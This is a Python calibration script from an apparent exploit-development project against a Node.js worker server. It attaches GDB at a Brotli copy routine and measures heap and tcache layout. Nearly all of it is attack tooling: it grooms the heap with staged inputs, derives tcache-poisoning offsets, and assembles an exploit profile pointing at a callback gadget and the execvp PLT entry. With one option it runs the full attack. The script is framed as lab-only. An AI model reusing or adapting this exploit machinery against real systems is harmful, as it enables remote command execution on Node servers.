#!/usr/bin/env python3
"""Measure PIE-build worker heap geometry in the isolated loopback lab.

This is a development-only calibration aid.  It attaches GDB to a Node process
that it starts itself, stops at the statically identified Brotli copy, and
records addresses plus the contemporaneous anonymous mappings.  Its output is
not accepted as final exploit proof; final verification must use the separate
network-only runner without GDB or runtime address reads.
"""

from __future__ import annotations

import argparse
import importlib.util
import json
import os
from pathlib import Path
import re
import socket
import subprocess
import sys
import tempfile
import time


ROOT = Path(__file__).parents[1]
SERVER = ROOT / "lab" / "worker-record-transform" / "server.js"
IMAGE = os.environ.get("N2S_PIE_RUNTIME_IMAGE", "node2shell-worker-runtime:ubuntu-24.04")
CONTAINER = "node2shell-pie-heap-calibration"
CALIBRATION = re.compile(
    r"N2S_PIE_CAL ring=(0x[0-9a-f]+) source=(0x[0-9a-f]+) "
    r"dest=(0x[0-9a-f]+) state=(0x[0-9a-f]+)"
)
TCACHE = re.compile(r"N2S_TCACHE pointer=(0x[0-9a-f]+) from_heap=(0x[0-9a-f]+)")
BIN_STATE = re.compile(
    r"N2S_BIN index=(\d+) count=(\d+) entry=([^ ]+) "
    r"source0=((?:0x)?[0-9a-f]+) source1=((?:0x)?[0-9a-f]+)"
)
NONZERO_BIN = re.compile(
    r"N2S_NONZERO index=(\d+) count=(\d+) entry=([^\r\n]+)"
)
WORKER_TCACHE = re.compile(
    r'Thread (\d+) \(Thread [^\n]+ "WorkerThread"\):\n'
    r'\$\d+ = \(tcache_perthread_struct \*\) (0x[0-9a-f]+)'
)


def load(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


HEAP = load("n2s_pie_cal_heap", ROOT / "poc" / "node2shell_heap.py")
PROFILER = load("n2s_pie_cal_profile", ROOT / "tools" / "profile_node_binary.py")
NETWORK = load(
    "n2s_pie_cal_network", ROOT / "tools" / "verify_aslr_network_matrix.py"
)


def mappings(pid: int) -> list[dict[str, object]]:
    result: list[dict[str, object]] = []
    for line in Path(f"/proc/{pid}/maps").read_text(encoding="ascii").splitlines():
        fields = line.split(None, 5)
        start_text, end_text = fields[0].split("-", 1)
        result.append(
            {
                "start": int(start_text, 16),
                "end": int(end_text, 16),
                "permissions": fields[1],
                "offset": int(fields[2], 16),
                "path": fields[5] if len(fields) == 6 else "",
            }
        )
    return result


def mapping_for(items: list[dict[str, object]], address: int) -> dict[str, object]:
    for item in items:
        if int(item["start"]) <= address < int(item["end"]):
            return item
    raise RuntimeError(f"no mapping contains {address:#x}")


def load_bias(items: list[dict[str, object]], binary: Path, docker_mode: bool) -> int:
    resolved = str(binary.resolve())
    candidates = {
        int(item["start"]) & ~0xFFF
        for item in items
        if int(item["offset"]) == 0
        and (
            item["path"] == resolved
            or (docker_mode and item["path"] == "/usr/local/bin/node")
        )
    }
    if len(candidates) != 1:
        raise RuntimeError(f"ambiguous PIE load biases: {sorted(candidates)}")
    return candidates.pop()


def wait_gdb_armed(
    process: subprocess.Popen[str], timeout: float, marker: str = "Breakpoint 1 at"
) -> list[str]:
    assert process.stdout is not None
    lines: list[str] = []
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        line = process.stdout.readline()
        if line:
            lines.append(line)
            if marker in line:
                return lines
        elif process.poll() is not None:
            break
    raise RuntimeError("GDB did not arm the PIE Brotli copy breakpoint")


def wait_ready(timeout: float) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", 3000), timeout=0.25) as probe:
                probe.sendall((0).to_bytes(4, "big"))
                if probe.recv(32) == b"PONG\n":
                    return
        except OSError:
            time.sleep(0.05)
    raise RuntimeError("loopback lab did not become ready")


def wait_docker_ready(timeout: float, leak_lane: bool = False) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        logs = docker("logs", CONTAINER, check=False).stdout
        lines = logs.splitlines()
        if "N2S_READY" in lines and (not leak_lane or "N2S_LEAK_READY" in lines):
            return
        time.sleep(0.1)
    raise RuntimeError("Docker lab did not emit its readiness marker")


def docker(*arguments: str, check: bool = True) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", *arguments],
        check=check,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )


def run(
    binary: Path,
    timeout: float,
    docker_mode: bool,
    hold_groom: bool,
    poison_position: int | None,
    record_size: int,
    include_transcript: bool,
    prime_worker: bool,
    watch_bss: bool,
    background_connections: int,
    hold_leak_lane: bool,
    release_leak_lane: bool,
) -> dict[str, object]:
    binary = binary.resolve()
    analysis = PROFILER.extract(binary)
    if analysis["elf_type"] != "ET_DYN":
        raise RuntimeError("calibration requires an ET_DYN Node binary")
    if analysis["copy_ring_expression"] != "r13+0x88":
        raise RuntimeError("unsupported PIE copy form for this calibration")

    node: subprocess.Popen[str] | None = None
    groom: socket.socket | None = None
    leak_lane: socket.socket | None = None
    backgrounds: list[socket.socket] = []
    try:
        leak_lane_enabled = hold_leak_lane or release_leak_lane
        if docker_mode:
            docker("rm", "-f", CONTAINER, check=False)
            environment = [
                "-e", "UV_THREADPOOL_SIZE=1",
                "-e", f"N2S_RECORD_SIZE={record_size:#x}",
            ]
            if leak_lane_enabled:
                environment.extend(
                    ("-e", "N2S_LEAK_RECORD_SIZE=0x330", "-e", "N2S_LEAK_PORT=3001")
                )
            docker(
                "run", "--platform", "linux/amd64", "-d",
                "--name", CONTAINER,
                "--label", "org.openai.node2shell-lab=true",
                "--label", "org.openai.node2shell-calibration=true",
                "--read-only", "--tmpfs", "/tmp:rw,noexec,nosuid,size=16m",
                "--cap-drop", "ALL", "--cap-add", "SYS_PTRACE",
                "--security-opt", "no-new-privileges",
                "--security-opt", "seccomp=unconfined",
                "--pids-limit", "128", "--memory", "512m", "--cpus", "1.0",
                "--network", "host",
                *environment,
                "-v", f"{binary}:/usr/local/bin/node:ro",
                "-v", f"{SERVER}:/app/worker-record-server.js:ro",
                "--entrypoint", "/usr/local/bin/node", IMAGE,
                "/app/worker-record-server.js",
            )
            pid_text = docker("inspect", "-f", "{{.State.Pid}}", CONTAINER).stdout.strip()
            pid = int(pid_text)
        else:
            environment = os.environ.copy()
            environment.update(
                {"UV_THREADPOOL_SIZE": "1", "N2S_RECORD_SIZE": f"{record_size:#x}"}
            )
            node = subprocess.Popen(
                [str(binary), str(SERVER)],
                cwd=ROOT,
                env=environment,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            )
            pid = node.pid
        if docker_mode:
            wait_docker_ready(timeout, leak_lane_enabled)
        else:
            if leak_lane_enabled:
                raise RuntimeError("leak-lane calibration currently requires --docker")
            wait_ready(timeout)
        if leak_lane_enabled:
            leak_lane = socket.create_connection(("127.0.0.1", 3001), min(timeout, 2.0))
            leak_lane.settimeout(timeout)
            one_byte_brotli = bytes.fromhex("0b00805803")
            leak_lane.sendall(HEAP.framed(one_byte_brotli[:1]))
            if HEAP.receive_line(leak_lane) != b"ACK\n":
                raise RuntimeError("held leak lane was not acknowledged")
            leak_lane.sendall(HEAP.framed(one_byte_brotli[1:]))
            if len(HEAP.receive_at_least(leak_lane, 0x330, 0x330)) != 0x330:
                raise RuntimeError("held leak lane returned a short record")
            if release_leak_lane:
                leak_lane.close()
                leak_lane = None
                time.sleep(0.5)
        if prime_worker:
            wait_ready(timeout)
            time.sleep(1.0)
        for _ in range(background_connections):
            background = HEAP._connect(timeout)
            background.sendall((1).to_bytes(4, "big"))
            backgrounds.append(background)
        if hold_groom:
            groom = HEAP._connect(timeout)
            groom.sendall(HEAP.framed(HEAP.stage_one(0x0003000000030000, 0xFFFFFF)))
            if HEAP.receive_line(groom) != b"ACK\n":
                raise RuntimeError("held groom stage was not acknowledged")
            groom.sendall(HEAP.framed(HEAP.stage_two(-1, 127)))
            if len(HEAP.receive_at_least(groom, 16384, 65536)) < 16384:
                raise RuntimeError("held groom output was too short")
        before = mappings(pid)
        bias = load_bias(before, binary, docker_mode)
        poison_first: bytes | None = None
        if poison_position is not None:
            if not hold_groom and not watch_bss:
                raise RuntimeError("poison-stage calibration requires --hold-groom")
            symbols = NETWORK.static_symbols(binary)
            plt = NETWORK.DIRECT.ANALYZER.plt_symbols(binary)
            static_base = min(symbols["pFree"], symbols["pContext"]) & ~0xF
            profile = HEAP.HeapProfile(
                version="24.22.0",
                node_binary_sha256=str(analysis["node_binary_sha256"]),
                bss_payload=bias + static_base,
                callback_gadget=bias + symbols["callback"],
                execvp_plt=bias + plt["execvp"],
                callback_pointer_offset=symbols["pFree"] - static_base,
                context_pointer_offset=symbols["pContext"] - static_base,
                poison_staged_position=poison_position,
                record_size=record_size,
                tcache_index=((record_size + 0xF) & ~0xF) // 0x10 - 1,
                ring_from_heap=1,
            )
            proof_payload = HEAP.build_fixed_proof(
                profile, "N2S_0123456789abcdef0123456789abcdef"
            )
            poison_first = HEAP.stage_one(profile.bss_payload, 0xFFBF10, proof_payload)
        if watch_bss:
            if poison_position is None:
                raise RuntimeError("BSS watch requires --poison-position")
            if hold_groom:
                raise RuntimeError("BSS watch runs the complete attack; omit --hold-groom")
            watch_breakpoint = bias + int(str(analysis["copy_breakpoint"]), 0)
            watch_commands = "\n".join(
                (
                    "set pagination off",
                    "set confirm off",
                    "set debuginfod enabled off",
                    f"break *{watch_breakpoint:#x}",
                    "commands 1",
                    "  silent",
                    "  set $n2s_ring = *(void**)($r13+0x88)",
                    "  if $rdi < $n2s_ring-0x100000 || $rdi > $n2s_ring+0x100000",
                    (
                        '    printf "N2S_FAR_COPY ring=%p source=%p dest=%p state=%p\\n", '
                        "$n2s_ring, $rsi, $rdi, $r13"
                    ),
                    "    x/2gx $rsi",
                    f"    thread apply all -s p tcache->counts[{profile.tcache_index}]",
                    f"    thread apply all -s p tcache->entries[{profile.tcache_index}]",
                    "    thread apply all -s p tcache",
                    "  end",
                    "  continue",
                    "end",
                    f"watch *(unsigned long long*){profile.bss_payload:#x}",
                    "commands 2",
                    "  silent",
                    (
                        f'  printf "N2S_BSS_WRITE address={profile.bss_payload:#x} '
                        'value=%#lx pc=%p\\n", '
                        f"*(unsigned long long*){profile.bss_payload:#x}, $pc"
                    ),
                    f"  x/8gx {profile.bss_payload:#x}",
                    "  detach",
                    "  quit",
                    "end",
                    "continue",
                    "",
                )
            )
            with tempfile.NamedTemporaryFile("w", encoding="utf-8", suffix=".gdb") as script:
                script.write(watch_commands)
                script.flush()
                debugger = subprocess.Popen(
                    ["gdb", "-q", "-batch", str(binary), "-p", str(pid), "-x", script.name],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,
                )
                prefix = wait_gdb_armed(debugger, timeout, "Hardware watchpoint 2")
                try:
                    proof = HEAP.attack(profile, timeout)
                    attack_result: dict[str, object] = proof
                except Exception as error:
                    attack_result = {
                        "result": "not-verified",
                        "error": f"{type(error).__name__}: {error}",
                    }
                try:
                    remainder, _ = debugger.communicate(timeout=3)
                except subprocess.TimeoutExpired:
                    debugger.kill()
                    remainder, _ = debugger.communicate(timeout=3)
            transcript = "".join(prefix) + remainder
            return {
                "mode": "development-bss-watch",
                "node_binary_sha256": analysis["node_binary_sha256"],
                "record_size": f"0x{record_size:x}",
                "poison_position": f"{poison_position:#x}",
                "bss_payload": f"0x{profile.bss_payload:x}",
                "bss_write_observed": "N2S_BSS_WRITE" in transcript,
                "attack": attack_result,
                "debugger_used": True,
                "runtime_address_read_used": True,
                "proof_eligible": False,
                "gdb_transcript_tail": transcript[-16000:],
            }
        breakpoint = bias + int(str(analysis["copy_breakpoint"]), 0)
        gdb_commands = [
                "set pagination off",
                "set confirm off",
                "set debuginfod enabled off",
                f"break *{breakpoint:#x}",
                "commands 1",
                "  silent",
                "  set $n2s_ring = *(void**)($r13+0x88)",
                "  set $n2s_heap = ((unsigned long long)$n2s_ring) & ~0x3ffffff",
                "  set $n2s_tcache = tcache",
                (
                    '  printf "N2S_PIE_CAL ring=%p source=%p dest=%p state=%p heap=%p\\n", '
                    "$n2s_ring, $rsi, $rdi, $r13, $n2s_heap"
                ),
                '  printf "N2S_TCACHE pointer=%p from_heap=%#lx\\n", $n2s_tcache, ((unsigned long long)$n2s_tcache)-$n2s_heap',
                (
                    f'  printf "N2S_BIN index={((record_size + 0xF) & ~0xF) // 0x10 - 1} '
                    'count=%u entry=%p source0=%#lx source1=%#lx\\n", '
                    f'tcache->counts[{((record_size + 0xF) & ~0xF) // 0x10 - 1}], '
                    f'tcache->entries[{((record_size + 0xF) & ~0xF) // 0x10 - 1}], '
                    "*(unsigned long long*)$rsi, *(unsigned long long*)($rsi+8)"
                ),
                "  set $n2s_i = 0",
                "  while $n2s_i < 64",
                "    if tcache->counts[$n2s_i] != 0",
                '      printf "N2S_NONZERO index=%d count=%u entry=%p\\n", $n2s_i, tcache->counts[$n2s_i], tcache->entries[$n2s_i]',
                "    end",
                "    set $n2s_i = $n2s_i + 1",
                "  end",
        ]
        gdb_commands.append("  thread apply all p tcache")
        if include_transcript:
            gdb_commands.extend(
                (
                    "  x/80gx $n2s_tcache",
                    "  x/192gx $n2s_heap+0x800",
                )
            )
        gdb_commands.extend(
            (
                "  detach",
                "  quit",
                "end",
                "continue",
                "",
            )
        )
        commands_text = "\n".join(gdb_commands)
        with tempfile.NamedTemporaryFile("w", encoding="utf-8", suffix=".gdb") as script:
            script.write(commands_text)
            script.flush()
            debugger = subprocess.Popen(
                ["gdb", "-q", "-batch", str(binary), "-p", str(pid), "-x", script.name],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )
            prefix = wait_gdb_armed(debugger, timeout)
            with HEAP._connect(timeout) as connection:
                first = (
                    poison_first
                    if poison_first is not None
                    else HEAP.stage_one(0x0003000000030000, 0xFFFFFF)
                )
                connection.sendall(HEAP.framed(first))
                if HEAP.receive_line(connection) != b"ACK\n":
                    raise RuntimeError("calibration stage was not acknowledged")
                second = (
                    HEAP.stage_two(poison_position, 27)
                    if poison_position is not None
                    else HEAP.stage_two(-1, 127)
                )
                connection.sendall(HEAP.framed(second))
                try:
                    remainder, _ = debugger.communicate(timeout=timeout)
                except subprocess.TimeoutExpired:
                    debugger.kill()
                    remainder, _ = debugger.communicate(timeout=3)
                    raise RuntimeError(
                        "GDB did not observe the PIE Brotli copy breakpoint: "
                        + ("".join(prefix) + remainder)[-2000:]
                    )
                during = mappings(pid)
        transcript = "".join(prefix) + remainder
        match = CALIBRATION.search(transcript)
        if match is None:
            raise RuntimeError("GDB returned no PIE calibration record: " + transcript[-2000:])
        tcache_match = TCACHE.search(transcript)
        if tcache_match is None:
            raise RuntimeError("GDB returned no tcache calibration record: " + transcript[-2000:])
        bin_match = BIN_STATE.search(transcript)
        if bin_match is None:
            raise RuntimeError("GDB returned no tcache-bin record: " + transcript[-2000:])
        ring, source, destination, state = (int(value, 16) for value in match.groups())
        tcache, tcache_from_heap = (
            int(value, 16) for value in tcache_match.groups()
        )
        observed_index = int(bin_match.group(1))
        observed_count = int(bin_match.group(2))
        observed_entry = bin_match.group(3)
        source_words = [
            f"0x{int(bin_match.group(4), 16):x}",
            f"0x{int(bin_match.group(5), 16):x}",
        ]
        nonzero_bins = [
            {
                "index": int(index),
                "count": int(count),
                "entry": entry,
                "record_size": f"0x{(int(index) + 1) * 0x10:x}",
            }
            for index, count, entry in NONZERO_BIN.findall(transcript)
        ]
        worker_tcaches = [
            {"gdb_thread": int(thread), "tcache": int(pointer, 16)}
            for thread, pointer in WORKER_TCACHE.findall(transcript)
        ]
        newest_worker = max(worker_tcaches, key=lambda item: int(item["gdb_thread"]))
        tcache_index = ((record_size + 0xF) & ~0xF) // 0x10 - 1
        tcache_entry = tcache + 0x80 + tcache_index * 8
        ring_from_heap = ring - int(ring & ~0x3FFFFFF)
        ring_mapping = mapping_for(during, ring)
        nearby = [
            item
            for item in during
            if not item["path"]
            and int(item["end"]) >= int(ring_mapping["start"]) - 0x10000000
            and int(item["start"]) <= int(ring_mapping["end"]) + 0x10000000
        ]
        result = {
            "binary": str(binary),
            "node_binary_sha256": analysis["node_binary_sha256"],
            "elf_type": analysis["elf_type"],
            "copy_breakpoint_offset": analysis["copy_breakpoint"],
            "load_bias": f"0x{bias:x}",
            "ring": f"0x{ring:x}",
            "source": f"0x{source:x}",
            "destination": f"0x{destination:x}",
            "state": f"0x{state:x}",
            "tcache": f"0x{tcache:x}",
            "tcache_from_heap": f"0x{tcache_from_heap:x}",
            "tcache_index": tcache_index,
            "tcache_bin_observation": {
                "index": observed_index,
                "count_before_store": observed_count,
                "entry_before_store": observed_entry,
                "source_words": source_words,
                "nonzero_bins": nonzero_bins,
            },
            "tcache_entry": f"0x{tcache_entry:x}",
            "tcache_entry_from_heap": f"0x{tcache_from_heap + 0x80 + tcache_index * 8:x}",
            "derived_poison_position": f"{tcache_entry - ring:#x}",
            "worker_thread_tcaches": [
                {
                    "gdb_thread": item["gdb_thread"],
                    "tcache": f"0x{int(item['tcache']):x}",
                }
                for item in worker_tcaches
            ],
            "exploit_worker_tcache": f"0x{int(newest_worker['tcache']):x}",
            "exploit_worker_tcache_entry": (
                f"0x{int(newest_worker['tcache']) + 0x80 + tcache_index * 8:x}"
            ),
            "derived_exploit_poison_position": (
                f"{int(newest_worker['tcache']) + 0x80 + tcache_index * 8 - ring:#x}"
            ),
            "ring_mapping": {
                **ring_mapping,
                "start": f"0x{int(ring_mapping['start']):x}",
                "end": f"0x{int(ring_mapping['end']):x}",
                "offset": f"0x{int(ring_mapping['offset']):x}",
            },
            "ring_from_mapping_start": f"0x{ring - int(ring_mapping['start']):x}",
            "nearby_anonymous_mappings": [
                {
                    **item,
                    "start": f"0x{int(item['start']):x}",
                    "end": f"0x{int(item['end']):x}",
                    "offset": f"0x{int(item['offset']):x}",
                }
                for item in nearby
            ],
            "debugger_used": True,
            "runtime_address_read_used": True,
            "proof_eligible": False,
            "runtime": "docker" if docker_mode else "direct-wsl",
            "held_groom_worker": hold_groom,
            "poison_position": (
                f"{poison_position:#x}" if poison_position is not None else None
            ),
            "record_size": f"0x{record_size:x}",
            "primed_worker": prime_worker,
            "background_connections": background_connections,
            "held_leak_lane": hold_leak_lane,
            "released_leak_lane_before_attack": release_leak_lane,
        }
        if include_transcript:
            result["gdb_transcript_tail"] = transcript[-12000:]
        return result
    finally:
        if groom is not None:
            groom.close()
        if leak_lane is not None:
            leak_lane.close()
        for background in backgrounds:
            background.close()
        if docker_mode:
            docker("rm", "-f", CONTAINER, check=False)
        elif node is not None:
            node.terminate()
            try:
                node.wait(timeout=3)
            except subprocess.TimeoutExpired:
                node.kill()
                node.wait(timeout=3)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("node_binary", type=Path)
    parser.add_argument("--timeout", type=float, default=15.0)
    parser.add_argument("--json-output", type=Path)
    parser.add_argument("--docker", action="store_true")
    parser.add_argument("--hold-groom", action="store_true")
    parser.add_argument("--poison-position", type=lambda value: int(value, 0))
    parser.add_argument(
        "--record-size", type=lambda value: int(value, 0), default=0x330
    )
    parser.add_argument("--include-transcript", action="store_true")
    parser.add_argument("--trials", type=int, default=1)
    parser.add_argument("--prime-worker", action="store_true")
    parser.add_argument("--watch-bss", action="store_true")
    parser.add_argument("--background-connections", type=int, default=0)
    parser.add_argument("--hold-leak-lane", action="store_true")
    parser.add_argument("--release-leak-lane", action="store_true")
    args = parser.parse_args()
    if not 0x100 <= args.record_size <= 0x400:
        parser.error("--record-size must be between 0x100 and 0x400")
    if not 0 <= args.background_connections <= 4:
        parser.error("--background-connections must be between 0 and 4")
    if not 1 <= args.trials <= 16:
        parser.error("--trials must be between 1 and 16")
    if args.hold_leak_lane and args.release_leak_lane:
        parser.error("choose only one leak-lane lifetime mode")
    trials = [
        run(
            args.node_binary,
            args.timeout,
            args.docker,
            args.hold_groom,
            args.poison_position,
            args.record_size,
            args.include_transcript,
            args.prime_worker,
            args.watch_bss,
            args.background_connections,
            args.hold_leak_lane,
            args.release_leak_lane,
        )
        for _ in range(args.trials)
    ]
    result = trials[0] if len(trials) == 1 else {
        "trial_count": len(trials),
        "distinct_poison_positions": sorted(
            {str(item["derived_poison_position"]) for item in trials}
        ),
        "distinct_exploit_poison_positions": sorted(
            {str(item["derived_exploit_poison_position"]) for item in trials}
        ),
        "trials": trials,
    }
    rendered = json.dumps(result, indent=2, sort_keys=True)
    print(rendered)
    if args.json_output:
        args.json_output.write_text(rendered + "\n", encoding="utf-8")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (OSError, RuntimeError, subprocess.SubprocessError) as error:
        print(f"ERROR: {error}", file=sys.stderr)
        raise SystemExit(1)
